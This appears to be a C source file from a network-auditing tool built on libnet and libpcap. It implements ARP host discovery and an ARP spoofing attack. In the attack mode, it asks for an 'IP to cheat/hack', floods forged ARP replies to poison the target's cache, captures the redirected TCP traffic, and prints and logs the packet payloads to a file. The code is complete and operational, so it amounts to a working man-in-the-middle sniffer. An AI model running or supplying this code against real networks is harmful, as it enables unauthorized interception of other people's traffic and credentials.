
#include <libnet.h>
#include <time.h>
#include <pthread.h>
#include "../auditing-cybersecurity.h"
#include "../activities/activities.h"
#include "../others/networking.h"
#include "../others/libpcap.h"

char *ipToCheat=NULL,*logFilePath=NULL;
u_char macBroadcastToCheat[6]={0};
long unsigned int delay=SNIFFING_THREAD_DELAY_US;
int numHosts=0;
Bool arpDiscoD=TRUE;

extern pcap_t *arpHandle;

//SNIFFING
static void sending_arp_sniffing_packets(){
	u_long srcIP=inet_addr(target.strTargetIp), dstIP=inet_addr(ipToCheat);
	char errbuf[BUFFER_SIZE_128B]="";
	libnet_t *libnetHandle=libnet_init(LIBNET_LINK,networkInfo.interfaceName,errbuf);
	while(!cancelCurrentProcess){
		libnet_build_arp(1,0x0800,6,4,ARP_REPLY,(u_char *) networkInfo.interfaceMacHex,(u_char *) &srcIP,
				(u_char *)macBroadcastToCheat,(u_char *) &dstIP,NULL,0,libnetHandle,0);
		libnet_build_ethernet((u_char *)macBroadcastToCheat,(u_char *) networkInfo.interfaceMacHex,0x0806,NULL,0,libnetHandle,0);
		if(libnet_write(libnetHandle)==-1) show_message(libnet_geterror(libnetHandle),0, 0, ERROR_MESSAGE,TRUE);
		usleep(delay);
		libnet_clear_packet(libnetHandle);
	}
	libnet_destroy(libnetHandle);
}

static void * start_sending_arp_sniffing_packets(void *ptr){
	sending_arp_sniffing_packets();
	pthread_exit(NULL);
}

static void process_sniffed_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	static int count = 1;
	const struct sniffIp *ip;
	const struct sniffTcp *tcp;
	const u_char *payload;
	int sizeIp, sizeTcp, sizePayload;
	count++;
	ip=(struct sniffIp*)(packet+SIZE_ETHERNET);
	sizeIp=IP_HL(ip)*4;
	tcp=(struct sniffTcp*)(packet + SIZE_ETHERNET + sizeIp);
	sizeTcp=TH_OFF(tcp)*4;
	switch(ip->ip_p) {
	case IPPROTO_TCP:
		payload=(u_char *)(packet+SIZE_ETHERNET+sizeIp+sizeTcp);
		sizePayload=ntohs(ip->ip_len)-(sizeIp+sizeTcp);
		if(sizePayload>1) {
			printf("\n                 From: %s\n",inet_ntoa(ip->ip_src));
			printf("                   To: %s\n",inet_ntoa(ip->ip_dst));
			printf("            Src. port: %d\n",ntohs(tcp->th_sport));
			printf("            Dst. port: %d\n",ntohs(tcp->th_dport));
			printf("                   ID: %d\n",ntohs(ip->ip_id));
			printf("  Payload (%d bytes): ",sizePayload);
			const u_char *ch=payload;
			printf("%s",C_HWHITE);
			for(int i=0;i<sizePayload;i++,ch++) (isprint(*ch) || (*ch=='\n'))?(printf("%c", *ch)):(printf("·"));
			printf("%s\n",C_DEFAULT);
			if(strcmp(logFilePath,"")!=0){
				time_t timestamp = time(NULL);
				struct tm tm = *localtime(&timestamp);
				char d[50]="", t[50]="", u[50]="";
				snprintf(d,sizeof(d),"%d/%02d/%02d",tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday);
				snprintf(t,sizeof(t),"%02d:%02d:%02d",tm.tm_hour, tm.tm_min, tm.tm_sec);
				snprintf(u,sizeof(u),"%s",tm.tm_zone);
				FILE *f=fopen(logFilePath,"a");
				u_char *buf=malloc(sizePayload+1);
				memset(buf,0,sizePayload+1);
				ch=payload;
				for(int i=0;i<sizePayload;i++,ch++) (isprint(*ch) || (*ch=='\n'))?(buf[i]=*ch):(buf[i]=' ');
				fprintf(f,"%d\t\"%s\"\t\"%s\"\t%d\t%d\t\"%s\"\t\"%s\"\t\"%s\"\t\"%s\"\n",ntohs(ip->ip_id),
						inet_ntoa(ip->ip_src),inet_ntoa(ip->ip_dst),ntohs(tcp->th_sport),ntohs(tcp->th_dport),buf,d,t,u);
				fclose(f);
				free(buf);
			}
			return;
		}
		break;
	default:
		break;
	}
	return;
}
//ARP DISCOVER
static void process_monitoring_arp_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	arphdr_t *arpheader=(struct arphdr *)(packet+14);
	char ip[20]="";
	snprintf(ip, sizeof(ip),"%d.%d.%d.%d", arpheader->spa[0], arpheader->spa[1], arpheader->spa[2], arpheader->spa[3]);
	struct in_addr auxAddr;
	if(inet_pton(AF_INET, ip, &auxAddr)==0) return;
	char strMac[18]="";
	sprintf(strMac, "%02X:%02X:%02X:%02X:%02X:%02X",arpheader->sha[0], arpheader->sha[1], arpheader->sha[2],arpheader->sha[3], arpheader->sha[4], arpheader->sha[5]);
	printf("    - %s:\t%s\n", ip, strMac);
	return;
}

static void send_arp_discover_packets_thread(){
	char errbuf[128]="";
	u_long srcIP=inet_addr(networkInfo.interfaceIp);
	u_char dstMAC[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
	do{
		libnet_t *libnetHandle=libnet_init(LIBNET_LINK,networkInfo.interfaceName,errbuf);
		if(arpDiscoD){
			time_t timestamp=time(0);
			struct tm tm = *localtime(&timestamp);
			char strTimeStamp[50]="";
			snprintf(strTimeStamp,sizeof(strTimeStamp),"%d/%02d/%02d %02d:%02d:%02d UTC:%s",tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, tm.tm_zone);
			printf("\n  %s\n\n", strTimeStamp);
		}
		for (int i=1;i<numHosts;i++) {
			u_long dstIP=htonl(ntohl(networkInfo.net) + i);
			int valResp=libnet_build_arp(1,0x0800,6,4,ARP_REQUEST,(u_char *)networkInfo.interfaceMacHex,(u_char *) &srcIP,dstMAC,(u_char *) &dstIP,NULL,0,libnetHandle,0);
			if(valResp==-1) show_message("Error building ARP: ", 0, errno, ERROR_MESSAGE, TRUE);
			valResp=libnet_build_ethernet(dstMAC,(u_char *)networkInfo.interfaceMacHex,0x0806,NULL,0,libnetHandle,0);
			if(valResp==-1) show_message("Error building ETHERNET: ", 0, errno, ERROR_MESSAGE, TRUE);
			valResp=libnet_write(libnetHandle);
			if(valResp==-1) show_message(libnet_geterror(libnetHandle),0,0, ERROR_MESSAGE,TRUE);
	        libnet_clear_packet(libnetHandle);
	        usleep(1000);
		}
		libnet_destroy(libnetHandle);
		usleep(ARP_DISCOVER_DELAY_US);
	}while(!cancelCurrentProcess);
}

static void * start_send_arp_discover_packets_thread(void *ptr){
	send_arp_discover_packets_thread();
	pthread_exit(NULL);
}
// GETTING MAC
static void process_get_mac_arp_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	arphdr_t *arpheader=(struct arphdr *)(packet+14);
	char ip[20]="";
	snprintf(ip, sizeof(ip),"%d.%d.%d.%d", arpheader->spa[0], arpheader->spa[1], arpheader->spa[2], arpheader->spa[3]);
	for(int i=0;i<6;i++) macBroadcastToCheat[i]=arpheader->sha[i];
	return;
}

int arp(int type){
	char errbuf[PCAP_ERRBUF_SIZE]="", pcapFilter[BUFFER_SIZE_128B]="";
	struct bpf_program fp;
	arpHandle=pcap_open_live(networkInfo.interfaceName,SNAP_LEN,TRUE,100,errbuf);
	if(arpHandle==NULL) return set_last_activity_error(DEVICE_OPENING_ERROR,"");;
	pcap_setnonblock(arpHandle, TRUE, errbuf);
	if(pcap_datalink(arpHandle)!=DLT_EN10MB){
		pcap_close(arpHandle);
		return set_last_activity_error(DEVICE_NOT_ETHERNET_ERROR,"");
	}
	switch(type){
	case ANY_ARP_SNIFFING:
		do{
			ipToCheat=get_readline("  Insert IP to cheat/hack (broadcast by default): ", FALSE);
			if(strcmp(ipToCheat,"")==0){
				free(ipToCheat);
				ipToCheat=inet_ntoa(networkInfo.netBroadcast);
				for(int i=0;i<6;i++) macBroadcastToCheat[i]=0xFF;
				break;
			}else{
				struct in_addr auxAddr;
				if(inet_pton(AF_INET, ipToCheat, &auxAddr) == 0){
					show_message("  Entered IP not valid",0, 0, ERROR_MESSAGE, TRUE);
					PRINT_RESET;
					free(ipToCheat);
					continue;
				}
				arp(OTHERS_ARP_DISCOVER_MAC);
				if(strcmp((char *) macBroadcastToCheat,"")==0){
					show_message("  IP no found into the network...\n",0, 0, ERROR_MESSAGE, FALSE);
					free(ipToCheat);
					PRINT_RESET;
					return RETURN_OK;
				}
				break;
			}
		}while(TRUE);
		printf("\n  MAC found: %02X:%02X:%02X:%02X:%02X:%02X\n", macBroadcastToCheat[0],macBroadcastToCheat[1], macBroadcastToCheat[2],
				macBroadcastToCheat[3],macBroadcastToCheat[4], macBroadcastToCheat[5]);
		delay=SNIFFING_THREAD_DELAY_US;
		char *userDelay=get_readline("\n  Insert thread sending packet delay in us -default value: 10000000 (10\")-: ", FALSE);
		if(strcmp(userDelay, "")!=0){
			char *endPtr=NULL;
			delay=strtol(userDelay,&endPtr,10);
			if(strcmp(userDelay,endPtr)==0 || delay<0){
				printf("\n  Entered value not valid. Using default.\n");
				delay=SNIFFING_THREAD_DELAY_US;
			}
		}
		free(userDelay);
		do{
			logFilePath=get_readline("\n  Insert log file path -empty no logging-: ", FALSE);
			if(strcmp(logFilePath,"")==0) break;
			FILE *f=NULL;
			if((f=fopen(logFilePath, "a"))==NULL){
				show_message("Cannot write in the specified location.", 0, 0, ERROR_MESSAGE, TRUE);
				continue;
			}
			fclose(f);
			break;
		}while(TRUE);
		snprintf(pcapFilter, BUFFER_SIZE_128B, "host %s", target.strTargetIp);
		if(pcap_compile(arpHandle,&fp,pcapFilter,0,networkInfo.net)==-1){
			pcap_close(arpHandle);
			pcap_freecode(&fp);
			return show_message("Error parsing filter",0, 0, ERROR_MESSAGE, TRUE);
		}
		if(pcap_setfilter(arpHandle,&fp)==-1){
			pcap_close(arpHandle);
			pcap_freecode(&fp);
			return show_message("Error installing filter",0, 0, ERROR_MESSAGE, TRUE);
		}
		pthread_t sendingArpSpoofedPacketsThread;
		printf("\n  Sniffing started...\n");
		if(pthread_create(&sendingArpSpoofedPacketsThread,NULL,&start_sending_arp_sniffing_packets,NULL)<0){
			pcap_close(arpHandle);
			pcap_freecode(&fp);
			return set_last_activity_error(THREAD_CREATION_ERROR,"");
		}
		pcap_loop(arpHandle, -1, process_sniffed_packet, NULL);
		pcap_close(arpHandle);
		pcap_freecode(&fp);
		pthread_cancel(sendingArpSpoofedPacketsThread);
		pthread_join(sendingArpSpoofedPacketsThread, NULL);
		printf("\n  Sniffing finished.");
		break;
	case OTHERS_ARP_DISCOVER:
	case OTHERS_ARP_DISCOVER_D:
		snprintf(pcapFilter, BUFFER_SIZE_128B,"arp and dst %s", networkInfo.interfaceIp);
		if(pcap_compile(arpHandle,&fp,pcapFilter,0,networkInfo.net)==-1) printf("Error parsing filter");
		if(pcap_setfilter(arpHandle,&fp)==-1) printf("Error installing filter");
		numHosts=~ntohl(networkInfo.mask) & 0xffffffff;
		pthread_t sendArpDiscoverPacketsThread;
		if(pthread_create(&sendArpDiscoverPacketsThread,NULL,&start_send_arp_discover_packets_thread,NULL)<0){
			pcap_close(arpHandle);
			pcap_freecode(&fp);
			return set_last_activity_error(THREAD_CREATION_ERROR,"");
		}
		if(type==OTHERS_ARP_DISCOVER_D){
			printf("\nNumber of hosts supported by the network: %s%d%s\n\n", C_HWHITE, numHosts, C_DEFAULT);
			printf("Hosts discovered: \n");
			pcap_loop(arpHandle, -1, process_monitoring_arp_packet, NULL);
		}else{
			arpDiscoD=FALSE;
			pcap_loop(arpHandle, -1, process_monitoring_arp_packet, NULL);
		}
		pthread_cancel(sendArpDiscoverPacketsThread);
		pthread_join(sendArpDiscoverPacketsThread,NULL);
		pcap_close(arpHandle);
		pcap_freecode(&fp);
		break;
	case OTHERS_ARP_DISCOVER_MAC:
		snprintf(pcapFilter, BUFFER_SIZE_128B,"arp and dst %s and src %s", networkInfo.interfaceIp, ipToCheat);
		if(pcap_compile(arpHandle,&fp,pcapFilter,0,networkInfo.net)==-1) printf("Error parsing filter");
		if(pcap_setfilter(arpHandle,&fp)==-1) printf("Error installing filter");
		char errbuf[128]="";
		libnet_t *libnetHandle=libnet_init(LIBNET_LINK,networkInfo.interfaceName,errbuf);
		u_long srcIP=inet_addr(networkInfo.interfaceIp);
		u_char dstMAC[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
		u_long dstIP=inet_addr(ipToCheat);
		libnet_build_arp(1,0x0800,6,4,ARP_REQUEST,(u_char *)networkInfo.interfaceMacHex,(u_char *) &srcIP,dstMAC,(u_char *) &dstIP,NULL,0,libnetHandle,0);
		libnet_build_ethernet(dstMAC,(u_char *)networkInfo.interfaceMacHex,0x0806,NULL,0,libnetHandle,0);
		libnet_write(libnetHandle);
		time_t tInit=time(0)+3;
		int resp=0;
		while(time(0)<tInit && resp==0) resp=pcap_dispatch(arpHandle, 1,process_get_mac_arp_packet, NULL);
		libnet_destroy(libnetHandle);
		break;
	default:
		break;
	}
	return RETURN_OK;
}



